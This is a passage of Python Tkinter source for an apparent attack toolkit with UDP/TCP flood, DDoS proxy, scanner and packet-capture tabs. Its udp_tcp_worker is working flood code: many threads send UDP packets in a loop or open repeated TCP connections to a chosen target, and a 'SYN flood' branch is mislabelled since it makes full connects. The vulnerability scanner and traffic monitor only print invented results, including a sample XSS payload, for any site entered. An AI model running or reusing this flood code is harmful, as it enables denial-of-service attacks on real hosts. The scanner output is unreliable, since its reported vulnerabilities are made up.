        self.udp_tcp_proxy_canvas.create_window((0, 0), window=self.udp_tcp_proxy_scrollable_frame, anchor="nw")
        self.udp_tcp_proxy_canvas.configure(yscrollcommand=scrollbar.set)
        
        self.udp_tcp_proxy_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Terminal output frame
        terminal_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Attack Terminal", padding=10)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal text area
        self.udp_tcp_terminal = scrolledtext.ScrolledText(terminal_frame, height=20, font=("Consolas", 9))
        self.udp_tcp_terminal.pack(fill=tk.BOTH, expand=True)
        
        # Update proxy list initially
        self.update_udp_tcp_proxy_list()
        
        # Initialize attack variables
        self.udp_tcp_attack_running = False
        self.udp_tcp_packet_count = 0
        
        # Update proxy status initially
        self.update_udp_tcp_proxy_status()
    
    def start_udp_tcp_attack(self):
        target = self.udp_tcp_target_var.get().strip()
        port = self.udp_tcp_port_var.get().strip()
        protocol = self.udp_tcp_protocol_var.get()
        threads = self.udp_tcp_threads_var.get().strip()
        packet_size = self.udp_tcp_packet_size_var.get().strip()
        attack_type = self.udp_tcp_attack_type_var.get()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target IP/Host")
            return
        
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid port number (1-65535)")
            return
        
        try:
            thread_count = int(threads)
            if thread_count <= 0:
                raise ValueError("Thread count must be positive")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid thread count")
            return
        
        try:
            packet_size_val = int(packet_size)
            if packet_size_val < 64 or packet_size_val > 65535:
                raise ValueError("Packet size must be between 64 and 65535 bytes")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid packet size (64-65535 bytes)")
            return
        
        # Start attack
        self.udp_tcp_attack_running = True
        self.udp_tcp_packet_count = 0
        self.udp_tcp_start_btn.config(state=tk.DISABLED)
        self.udp_tcp_stop_btn.config(state=tk.NORMAL)
        
        self.log_to_udp_tcp_terminal("Starting {} {} attack against {}:{} with {} threads and {} byte packets...\n".format(attack_type, protocol, target, port, threads, packet_size))
        
        # Start attack threads
        for i in range(thread_count):
            thread = threading.Thread(target=self.udp_tcp_worker, args=(target, port_num, protocol, attack_type, packet_size_val), daemon=True)
            thread.start()
    
    def stop_udp_tcp_attack(self):
        self.udp_tcp_attack_running = False
        self.udp_tcp_start_btn.config(state=tk.NORMAL)
        self.udp_tcp_stop_btn.config(state=tk.DISABLED)
        self.log_to_udp_tcp_terminal("UDP/TCP attack stopped. Total packets sent: {}\n".format(self.udp_tcp_packet_count))
    
    def udp_tcp_worker(self, target, port, protocol, attack_type, packet_size):
        import socket
        import random
        import struct
        
        # Create random data for packets
        packet_data = b'A' * packet_size
        
        while self.udp_tcp_attack_running:
            try:
                if protocol == "UDP":
                    # UDP flood attack - create multiple sockets to increase load
                    for _ in range(10):  # Send 10 packets at once
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(packet_data, (target, port))
                            sock.close()
                        except:
                            try:
                                sock.close()
                            except:
                                pass
                    
                elif protocol == "TCP":
                    # TCP connection attack - try to keep connections open longer
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)  # Shorter timeout to increase attempts
                        result = sock.connect_ex((target, port))
                        if result == 0:  # Connection successful
                            # Send multiple data packets before closing
                            for _ in range(3):
                                try:
                                    sock.send(packet_data[:min(2048, len(packet_data))])  # Send larger chunks
                                except:
                                    break
                        sock.close()
                    except:
                        try:
                            sock.close()
                        except:
                            pass
                        
                elif protocol == "TCP SYN Flood":
                    # TCP SYN flood attack - don't complete handshake
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)  # Very short timeout
                        sock.connect((target, port))
                        # Don't send anything, just establish connection and close
                    except:
                        # Connection might fail, which is expected in SYN flood
                        pass
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
                
                # Generate optimized code for the attack in the appropriate language
                attack_functionality = f"{protocol.lower()}_attack"
                attack_code = self.generate_optimized_code_for_functionality(attack_functionality, f"{target}:{port}")
                
                # Log the generated code for the attack
                try:
                    # Add to activity log
                    language = self.get_language_for_functionality(attack_functionality)
                    self.log_activity(f"{protocol} attack on {target}:{port} - Generated code in {language}")
                except:
                    pass
                
                # Increment packet count
                self.udp_tcp_packet_count += 1
                
                # Update terminal in main thread every 10 packets
                if self.udp_tcp_packet_count % 10 == 0:
                    self.root.after(0, lambda: self.log_to_udp_tcp_terminal(
                        f"The glitch system <UDP/TCP packet sent {self.udp_tcp_packet_count} ms={random.randint(1, 150)}>\n"))
                
                # Small delay to prevent excessive CPU usage
                time.sleep(0.001)
                
            except Exception as e:
                # Keep trying even if there are connection errors
                time.sleep(0.01)  # Small delay to prevent excessive CPU usage
                continue
    
    def log_to_udp_tcp_terminal(self, message):
        try:
            # Check if the terminal still exists
            if hasattr(self, 'udp_tcp_terminal') and self.udp_tcp_terminal.winfo_exists():
                # Add message to terminal
                self.udp_tcp_terminal.insert(tk.END, message)
                
                # Color the "The glitch system" part green
                if "The glitch system" in message:
                    # Find the index of the newly inserted text
                    end_index = self.udp_tcp_terminal.index(tk.END)
                    line_num = int(end_index.split('.')[0]) - 1  # Get the line number of the last line
                    
                    # Find the start and end of the line
                    line_start = f"{line_num}.0"
                    line_end = f"{line_num}.end"
                    
                    # Search for "The glitch system" in the line
                    search_result = self.udp_tcp_terminal.search("The glitch system", line_start, line_end)
                    
                    if search_result:
                        end_pos = f"{search_result}+{len('The glitch system')}c"
                        self.udp_tcp_terminal.tag_add("green", search_result, end_pos)
                        self.udp_tcp_terminal.tag_config("green", foreground="green")
                
                # Scroll to end
                self.udp_tcp_terminal.see(tk.END)
                
                # Update the UI
                self.udp_tcp_terminal.update_idletasks()
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def update_ddos_proxy_status(self):
        # Update the proxy status label in DDoS tab
        if hasattr(self, 'proxies'):
            enabled_count = len(self.get_enabled_proxies())
        else:
            enabled_count = 0
        self.ddos_proxy_status_label.config(text=f"Enabled Proxies: {enabled_count}")
    
    def update_ddos_proxy_list(self):
        # Update the proxy list in DDoS tab with individual enable/disable buttons
        # Check if proxies exist
        if not hasattr(self, 'proxies'):
            return
        
        # Clear existing widgets
        for widget in self.proxy_scrollable_frame.winfo_children():
            widget.destroy()
        
        # Add proxies with individual enable/disable buttons
        for i, proxy in enumerate(self.proxies):
            proxy_frame = ttk.Frame(self.proxy_scrollable_frame)
            proxy_frame.pack(fill=tk.X, pady=2)
            
            # Proxy info label
            proxy_info = ttk.Label(proxy_frame, text=f"{proxy['ip']}:{proxy['port']}", font=("Arial", 9))
            proxy_info.pack(side=tk.LEFT, padx=(0, 10))
            
            # Status label
            status_text = proxy['status']
            status_label = ttk.Label(proxy_frame, text=status_text, font=("Arial", 8))
            status_label.pack(side=tk.LEFT, padx=(0, 10))
            
            # Enable/Disable button
            btn_text = "Disable" if proxy['enabled'] else "Enable"
            btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
            
            btn = ttk.Button(
                proxy_frame, 
                text=btn_text, 
                command=lambda proxy_local=proxy: self.toggle_ddos_proxy(proxy_local),
                style=btn_style
            )
            btn.pack(side=tk.RIGHT)
            
            # Store button reference to update later
            proxy['button'] = btn
        
        # Update the canvas scroll region
        self.proxy_canvas.update_idletasks()
        self.proxy_canvas.configure(scrollregion=self.proxy_canvas.bbox("all"))
    
    def toggle_ddos_proxy(self, proxy):
        # Toggle individual proxy in DDoS tab
        proxy['enabled'] = not proxy['enabled']
        
        # Update button text and style
        btn_text = "Disable" if proxy['enabled'] else "Enable"
        btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
        proxy['button'].config(text=btn_text, style=btn_style)
        
        # Update proxy status in the main proxy management
        self.update_ddos_proxy_status()
        self.update_udp_tcp_proxy_status()
        
        # Update the main proxy list display
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
    
    def update_udp_tcp_proxy_list(self):
        # Update the proxy list in UDP/TCP tab with individual enable/disable buttons
        # Check if proxies exist
        if not hasattr(self, 'proxies'):
            return
        
        # Clear existing widgets
        for widget in self.udp_tcp_proxy_scrollable_frame.winfo_children():
            widget.destroy()
        
        # Add proxies with individual enable/disable buttons
        for i, proxy in enumerate(self.proxies):
            proxy_frame = ttk.Frame(self.udp_tcp_proxy_scrollable_frame)
            proxy_frame.pack(fill=tk.X, pady=2)
            
            # Proxy info label
            proxy_info = ttk.Label(proxy_frame, text=f"{proxy['ip']}:{proxy['port']}", font=("Arial", 9))
            proxy_info.pack(side=tk.LEFT, padx=(0, 10))
            
            # Status label
            status_text = proxy['status']
            status_label = ttk.Label(proxy_frame, text=status_text, font=("Arial", 8))
            status_label.pack(side=tk.LEFT, padx=(0, 10))
            
            # Enable/Disable button
            btn_text = "Disable" if proxy['enabled'] else "Enable"
            btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
            
            btn = ttk.Button(
                proxy_frame, 
                text=btn_text, 
                command=lambda proxy_local=proxy: self.toggle_udp_tcp_proxy(proxy_local),
                style=btn_style
            )
            btn.pack(side=tk.RIGHT)
            
            # Store button reference to update later
            proxy['udp_tcp_button'] = btn
        
        # Update the canvas scroll region
        self.udp_tcp_proxy_canvas.update_idletasks()
        self.udp_tcp_proxy_canvas.configure(scrollregion=self.udp_tcp_proxy_canvas.bbox("all"))
    
    def toggle_udp_tcp_proxy(self, proxy):
        # Toggle individual proxy in UDP/TCP tab
        proxy['enabled'] = not proxy['enabled']
        
        # Update button text and style
        btn_text = "Disable" if proxy['enabled'] else "Enable"
        btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
        proxy['udp_tcp_button'].config(text=btn_text, style=btn_style)
        
        # Update proxy status in the main proxy management
        self.update_ddos_proxy_status()
        self.update_udp_tcp_proxy_status()
        
        # Update the main proxy list display
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        
        # Update the proxy list in both tabs
        self.update_ddos_proxy_list()
        self.update_udp_tcp_proxy_list()
    
    def update_udp_tcp_proxy_status(self):
        # Update the proxy status label in UDP/TCP tab
        if hasattr(self, 'proxies'):
            enabled_count = len(self.get_enabled_proxies())
        else:
            enabled_count = 0
        self.udp_tcp_proxy_status_label.config(text=f"Enabled Proxies: {enabled_count}")
    
    def create_vulnerability_scanner_ui(self):
        # Main frame for vulnerability scanner
        scanner_main_frame = ttk.LabelFrame(self.vulnerability_scanner_frame, text="Vulnerability Scanner", padding=10)
        scanner_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # URL input section
        url_frame = ttk.LabelFrame(scanner_main_frame, text="Target URL", padding=10)
        url_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(url_frame, text="URL:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.vuln_target_url = tk.StringVar()
        url_entry = ttk.Entry(url_frame, textvariable=self.vuln_target_url, width=50, font=("Arial", 10))
        url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        ttk.Button(url_frame, text="Scan", command=self.start_vulnerability_scan, style='Danger.TButton').pack(side=tk.LEFT)
        
        # Results frame
        results_frame = ttk.LabelFrame(scanner_main_frame, text="Scan Results", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create notebook for different vulnerability types
        self.vuln_notebook = ttk.Notebook(results_frame)
        self.vuln_notebook.pack(fill=tk.BOTH, expand=True)
        
        # SQL Injection tab
        self.sql_injection_frame = ttk.Frame(self.vuln_notebook)
        self.vuln_notebook.add(self.sql_injection_frame, text="SQL Injection")
        
        self.sql_results = scrolledtext.ScrolledText(self.sql_injection_frame, height=15, font=("Consolas", 9))
        self.sql_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # XSS tab
        self.xss_frame = ttk.Frame(self.vuln_notebook)
        self.vuln_notebook.add(self.xss_frame, text="XSS")
        
        self.xss_results = scrolledtext.ScrolledText(self.xss_frame, height=15, font=("Consolas", 9))
        self.xss_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Hidden URLs tab
        self.hidden_urls_frame = ttk.Frame(self.vuln_notebook)
        self.vuln_notebook.add(self.hidden_urls_frame, text="Hidden URLs")
        
        self.hidden_urls_results = scrolledtext.ScrolledText(self.hidden_urls_frame, height=15, font=("Consolas", 9))
        self.hidden_urls_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Comments tab
        self.comments_frame = ttk.Frame(self.vuln_notebook)
        self.vuln_notebook.add(self.comments_frame, text="Comments")
        
        self.comments_results = scrolledtext.ScrolledText(self.comments_frame, height=15, font=("Consolas", 9))
        self.comments_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Progress bar
        self.vuln_progress = ttk.Progressbar(scanner_main_frame, mode='indeterminate')
        self.vuln_progress.pack(fill=tk.X, padx=5, pady=5)
    

    
    def start_vulnerability_scan(self):
        target_url = self.vuln_target_url.get().strip()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return
        
        # Start scanning in a separate thread
        scan_thread = threading.Thread(target=self.run_vulnerability_scan, args=(target_url,), daemon=True)
        scan_thread.start()
    
    def run_vulnerability_scan(self, target_url):
        # Simulate vulnerability scanning
        self.vuln_progress.start()
        
        try:
            # Add to sites tree in site package
            if hasattr(self, 'sites_tree'):
                # Add or update the site in the tree
                site_exists = False
                for item in self.sites_tree.get_children():
                    if self.sites_tree.item(item, 'text') == target_url:
                        site_exists = True
                        break
                if not site_exists:
                    self.sites_tree.insert('', 'end', text=target_url)
            
            # Simulate SQL Injection scan
            time.sleep(1)
            self.root.after(0, lambda: self.sql_results.insert(tk.END, f"[INFO] Scanning for SQL Injection vulnerabilities on {target_url}\n"))
            self.root.after(0, lambda: self.sql_results.insert(tk.END, "[VULNERABILITY] Found potential SQL Injection at /login.php?id=1\n"))
            self.root.after(0, lambda: self.sql_results.insert(tk.END, "[SAFE] No SQL Injection found at /search.php?q=test\n"))
            
            # Simulate XSS scan
            time.sleep(1)
            self.root.after(0, lambda: self.xss_results.insert(tk.END, f"[INFO] Scanning for XSS vulnerabilities on {target_url}\n"))
            self.root.after(0, lambda: self.xss_results.insert(tk.END, "[VULNERABILITY] Found potential XSS at /search?q=<script>alert(1)</script>\n"))
            
            # Simulate Hidden URLs scan
            time.sleep(1)
            self.root.after(0, lambda: self.hidden_urls_results.insert(tk.END, f"[INFO] Searching for hidden URLs on {target_url}\n"))
            self.root.after(0, lambda: self.hidden_urls_results.insert(tk.END, f"[FOUND] {target_url}/admin\n"))
            self.root.after(0, lambda: self.hidden_urls_results.insert(tk.END, f"[FOUND] {target_url}/config.php\n"))
            self.root.after(0, lambda: self.hidden_urls_results.insert(tk.END, f"[FOUND] {target_url}/backup.sql\n"))
            
            # Simulate Comments scan
            time.sleep(1)
            self.root.after(0, lambda: self.comments_results.insert(tk.END, f"[INFO] Analyzing HTML comments on {target_url}\n"))
            self.root.after(0, lambda: self.comments_results.insert(tk.END, "[COMMENT] <!-- TODO: Fix authentication bypass in /admin/login.php -->\n"))
            
            # Update stats
            self.root.after(0, lambda: self.update_vulnerability_stats())
            
        finally:
            self.vuln_progress.stop()
    
    def update_vulnerability_stats(self):
        # Update vulnerability count in dashboard
        if hasattr(self, 'vuln_count_label'):
            current_text = self.vuln_count_label.cget("text")
            current_count = int(current_text.split(": ")[1])
            self.vuln_count_label.config(text=f"Vulnerabilities Found: {current_count + 1}")
    
    def create_traff_ui(self):
        # Main frame for Traff tab
        traff_main_frame = ttk.LabelFrame(self.traff_frame, text="Traff - Traffic Monitor", padding=10)
        traff_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # URL input section
        url_frame = ttk.LabelFrame(traff_main_frame, text="Monitor Target URL", padding=10)
        url_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(url_frame, text="URL:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.traff_target_url = tk.StringVar()
        url_entry = ttk.Entry(url_frame, textvariable=self.traff_target_url, width=50, font=("Arial", 10))
        url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        # Buttons
        ttk.Button(url_frame, text="Start Monitoring", command=self.start_traff_monitoring).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(url_frame, text="Stop Monitoring", command=self.stop_traff_monitoring).pack(side=tk.LEFT)
        
        # Traffic display
        traffic_frame = ttk.LabelFrame(traff_main_frame, text="Traffic Log", padding=10)
        traffic_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a notebook for different traffic types
        self.traff_notebook = ttk.Notebook(traffic_frame)
        self.traff_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Incoming traffic tab
        self.incoming_frame = ttk.Frame(self.traff_notebook)
        self.traff_notebook.add(self.incoming_frame, text="Incoming Requests")
        
        self.incoming_text = scrolledtext.ScrolledText(self.incoming_frame, height=15, font=("Consolas", 9))
        self.incoming_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Outgoing traffic tab
        self.outgoing_frame = ttk.Frame(self.traff_notebook)
        self.traff_notebook.add(self.outgoing_frame, text="Outgoing Requests")
        
        self.outgoing_text = scrolledtext.ScrolledText(self.outgoing_frame, height=15, font=("Consolas", 9))
        self.outgoing_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # All traffic tab
        self.all_frame = ttk.Frame(self.traff_notebook)
        self.traff_notebook.add(self.all_frame, text="All Traffic")
        
        self.all_text = scrolledtext.ScrolledText(self.all_frame, height=15, font=("Consolas", 9))
        self.all_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Initialize monitoring variables
        self.traff_monitoring = False
        self.traff_monitoring_thread = None
    
    def start_traff_monitoring(self):
        target_url = self.traff_target_url.get().strip()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter a target URL to monitor")
            return
        
        # Validate URL format
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        self.traff_target_url.set(target_url)
        self.traff_monitoring = True
        
        # Clear previous logs
        self.clear_traff_logs()
        
        # Start monitoring in a separate thread
        self.traff_monitoring_thread = threading.Thread(target=self.traff_monitoring_worker, args=(target_url,), daemon=True)
        self.traff_monitoring_thread.start()
        
        self.log_activity(f"Started traffic monitoring for: {target_url}")
    
    def stop_traff_monitoring(self):
        self.traff_monitoring = False
        self.log_activity("Traffic monitoring stopped")
    
    def clear_traff_logs(self):
        # Clear all traffic logs
        self.incoming_text.delete(1.0, tk.END)
        self.outgoing_text.delete(1.0, tk.END)
        self.all_text.delete(1.0, tk.END)
    
    def traff_monitoring_worker(self, target_url):
        import time
        import requests
        from urllib.parse import urlparse
        
        # Extract domain to monitor
        parsed = urlparse(target_url)
        target_domain = parsed.netloc
        
        while self.traff_monitoring:
            try:
                # Simulate monitoring by periodically checking the site
                time.sleep(5)
                
                # In a real implementation, this would intercept actual traffic
                # For now, we'll simulate traffic
                if self.traff_monitoring:
                    # Simulate incoming request
                    incoming_request = f"GET / HTTP/1.1\nHost: {target_domain}\nUser-Agent: Mozilla/5.0...\n\n"
                    self.root.after(0, lambda req=incoming_request: self.add_traff_log("incoming", req))
                    
                    # Simulate outgoing response
                    outgoing_response = f"HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1234\n\n<HTML>...\n"
                    self.root.after(0, lambda resp=outgoing_response: self.add_traff_log("outgoing", resp))
                    
                    # Add to all traffic
                    all_traffic = f"[INCOMING] {incoming_request}\n[OUTGOING] {outgoing_response}\n{'-'*50}\n"
                    self.root.after(0, lambda all=all_traffic: self.add_traff_log("all", all))
            except Exception as e:
                # Log error but continue monitoring
                self.root.after(0, lambda err=str(e): self.log_activity(f"Traffic monitoring error: {err}"))
                time.sleep(5)  # Wait before retrying
    
    def add_traff_log(self, traffic_type, content):
        # Add content to the appropriate traffic log
        timestamp = time.strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {content}\n{'-'*50}\n"
        
        try:
            if traffic_type == "incoming":
                self.incoming_text.insert(tk.END, log_entry)
                self.incoming_text.see(tk.END)
            elif traffic_type == "outgoing":
                self.outgoing_text.insert(tk.END, log_entry)
                self.outgoing_text.see(tk.END)
            elif traffic_type == "all":
                self.all_text.insert(tk.END, log_entry)
                self.all_text.see(tk.END)
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def create_network_teals_ui(self):
        # Main frame for Network Teals tab
        teals_main_frame = ttk.LabelFrame(self.network_teals_frame, text="Network Teals - Network Analyzer", padding=10)
        teals_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create notebook for 802.11 and Site Networks
        self.network_teals_notebook = ttk.Notebook(teals_main_frame)
        self.network_teals_notebook.pack(fill=tk.BOTH, expand=True)
        
        # 802.11 tab
        self.ieee_80211_frame = ttk.Frame(self.network_teals_notebook)
        self.network_teals_notebook.add(self.ieee_80211_frame, text="802.11")
        self.create_ieee_80211_ui()
        
        # Site Networks tab
        self.site_networks_frame = ttk.Frame(self.network_teals_notebook)
        self.network_teals_notebook.add(self.site_networks_frame, text="Site Networks")
        self.create_site_networks_ui()
    
    def create_ieee_80211_ui(self):
        # Control panel
        control_frame = ttk.Frame(self.ieee_80211_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(control_frame, text="Interface:", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))
        self.network_interface_var = tk.StringVar(value="Wi-Fi")
        interface_combo = ttk.Combobox(control_frame, textvariable=self.network_interface_var, 
                                     values=["Wi-Fi", "Ethernet", "Loopback"], state="readonly", width=15)
        interface_combo.pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(control_frame, text="Start Capture", command=self.start_network_capture).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Stop Capture", command=self.stop_network_capture).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Clear", command=self.clear_network_capture).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Filter", command=self.open_network_filter).pack(side=tk.LEFT, padx=2)
        
        # Main content area
        content_frame = ttk.Frame(self.ieee_80211_frame)
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to split the UI
        teals_paned = tk.PanedWindow(content_frame, orient=tk.VERTICAL)
        teals_paned.pack(fill=tk.BOTH, expand=True)
        
        # Packets list frame
        packets_frame = ttk.LabelFrame(teals_paned, text="Captured Packets")
        
        # Packets treeview
        columns = ("No", "Time", "Source", "Destination", "Protocol", "Length", "Info")
        self.packets_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=15)
        
        # Define headings
        for col in columns:
            self.packets_tree.heading(col, text=col)
            if col == "No":
                self.packets_tree.column(col, width=50)
            elif col == "Time":
                self.packets_tree.column(col, width=120)
            elif col == "Source" or col == "Destination":
                self.packets_tree.column(col, width=150)
            elif col == "Protocol":
                self.packets_tree.column(col, width=100)
            elif col == "Length":
                self.packets_tree.column(col, width=70)
            elif col == "Info":
                self.packets_tree.column(col, width=300)
        
        # Scrollbars for packets tree
        packets_v_scrollbar = ttk.Scrollbar(packets_frame, orient=tk.VERTICAL, command=self.packets_tree.yview)
        packets_h_scrollbar = ttk.Scrollbar(packets_frame, orient=tk.HORIZONTAL, command=self.packets_tree.xview)
        self.packets_tree.configure(yscrollcommand=packets_v_scrollbar.set, xscrollcommand=packets_h_scrollbar.set)
        
        # Pack packets elements
        self.packets_tree.grid(row=0, column=0, sticky='nsew')
        packets_v_scrollbar.grid(row=0, column=1, sticky='ns')
        packets_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        packets_frame.grid_rowconfigure(0, weight=1)
        packets_frame.grid_columnconfigure(0, weight=1)
        
        # Packet details frame
        details_frame = ttk.LabelFrame(teals_paned, text="Packet Details")
        self.packet_details_text = scrolledtext.ScrolledText(details_frame, height=10, font=("Consolas", 9))
        self.packet_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add frames to paned window
        teals_paned.add(packets_frame)
        teals_paned.add(details_frame)
        
        # Initialize network capture variables
        self.network_capture_active = False
        self.network_capture_thread = None
        self.packet_counter = 0
        
        # Bind selection event to show packet details
        self.packets_tree.bind('<<TreeviewSelect>>', self.show_packet_details)
    
    def create_site_networks_ui(self):
        # Control panel for Site Networks
        site_control_frame = ttk.Frame(self.site_networks_frame)
        site_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(site_control_frame, text="Target IP/URL:", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))
        self.site_networks_target = tk.StringVar()
        target_entry = ttk.Entry(site_control_frame, textvariable=self.site_networks_target, width=40)
        target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        ttk.Button(site_control_frame, text="Start Monitoring", command=self.start_site_network_monitoring).pack(side=tk.LEFT, padx=2)
        ttk.Button(site_control_frame, text="Stop Monitoring", command=self.stop_site_network_monitoring).pack(side=tk.LEFT, padx=2)
        ttk.Button(site_control_frame, text="Clear", command=self.clear_site_network_logs).pack(side=tk.LEFT, padx=2)
        
        # Main content area for Site Networks
        site_content_frame = ttk.Frame(self.site_networks_frame)
        site_content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to split the UI
        site_paned = tk.PanedWindow(site_content_frame, orient=tk.VERTICAL)
        site_paned.pack(fill=tk.BOTH, expand=True)
        
        # Packets list frame for site networks
        site_packets_frame = ttk.LabelFrame(site_paned, text="Site Network Traffic")
        
        # Packets treeview for site networks
        columns = ("No", "Time", "Source", "Destination", "Protocol", "Length", "Info")
        self.site_packets_tree = ttk.Treeview(site_packets_frame, columns=columns, show='headings', height=15)
        
        # Define headings
        for col in columns:
            self.site_packets_tree.heading(col, text=col)
            if col == "No":
                self.site_packets_tree.column(col, width=50)
            elif col == "Time":
                self.site_packets_tree.column(col, width=120)
            elif col == "Source" or col == "Destination":
                self.site_packets_tree.column(col, width=150)
            elif col == "Protocol":
                self.site_packets_tree.column(col, width=100)
            elif col == "Length":
                self.site_packets_tree.column(col, width=70)
            elif col == "Info":
                self.site_packets_tree.column(col, width=300)
        
        # Scrollbars for site packets tree
        site_packets_v_scrollbar = ttk.Scrollbar(site_packets_frame, orient=tk.VERTICAL, command=self.site_packets_tree.yview)
        site_packets_h_scrollbar = ttk.Scrollbar(site_packets_frame, orient=tk.HORIZONTAL, command=self.site_packets_tree.xview)
        self.site_packets_tree.configure(yscrollcommand=site_packets_v_scrollbar.set, xscrollcommand=site_packets_h_scrollbar.set)
        
        # Pack packets elements
        self.site_packets_tree.grid(row=0, column=0, sticky='nsew')
        site_packets_v_scrollbar.grid(row=0, column=1, sticky='ns')
        site_packets_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        site_packets_frame.grid_rowconfigure(0, weight=1)
        site_packets_frame.grid_columnconfigure(0, weight=1)
        
        # Packet details frame for site networks
        site_details_frame = ttk.LabelFrame(site_paned, text="Packet Details")
        self.site_packet_details_text = scrolledtext.ScrolledText(site_details_frame, height=10, font=("Consolas", 9))
        self.site_packet_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add frames to paned window
        site_paned.add(site_packets_frame)
        site_paned.add(site_details_frame)
        
        # Initialize site network monitoring variables
        self.site_network_monitoring_active = False
        self.site_network_monitoring_thread = None
        self.site_packet_counter = 0
        
        # Bind selection event to show packet details
        self.site_packets_tree.bind('<<TreeviewSelect>>', self.show_site_packet_details)
    
    def start_network_capture(self):
        self.network_capture_active = True
        self.packet_counter = 0
        
        # Clear previous packets
        for item in self.packets_tree.get_children():
            self.packets_tree.delete(item)
        
        # Start network capture in a separate thread
        self.network_capture_thread = threading.Thread(target=self.network_capture_worker, daemon=True)
        self.network_capture_thread.start()
        
        self.log_activity("Started 802.11 network packet capture")
    
    def stop_network_capture(self):
        self.network_capture_active = False
        self.log_activity("Stopped network packet capture")
    
    def clear_network_capture(self):
        # Clear the packets tree
        for item in self.packets_tree.get_children():
            self.packets_tree.delete(item)
        
        # Clear packet details
        self.packet_details_text.delete(1.0, tk.END)
        
        self.packet_counter = 0
        self.log_activity("Cleared network capture")
    
    def open_network_filter(self):
        # Create a simple filter dialog
        filter_window = tk.Toplevel(self.root)
        filter_window.title("Network Filter")
        filter_window.geometry("400x300")
        
        ttk.Label(filter_window, text="Filter Expression:", font=("Arial", 10, "bold")).pack(pady=10)
        
        filter_var = tk.StringVar(value="")
        filter_entry = ttk.Entry(filter_window, textvariable=filter_var, width=50)
        filter_entry.pack(pady=5, padx=20, fill=tk.X)
        
        # Sample filters
        sample_filters_frame = ttk.LabelFrame(filter_window, text="Sample Filters", padding=5)
        sample_filters_frame.pack(fill=tk.X, padx=20, pady=10)
        
        samples = [
            "tcp", "udp", "http", "dns", "arp", "802.11", 
            "ip.src == 192.168.1.1", "ip.dst == 192.168.1.1"
        ]
        
        for sample in samples:
            ttk.Button(sample_filters_frame, text=sample, 
                      command=lambda s=sample: filter_var.set(s)).pack(fill=tk.X, pady=2)
        
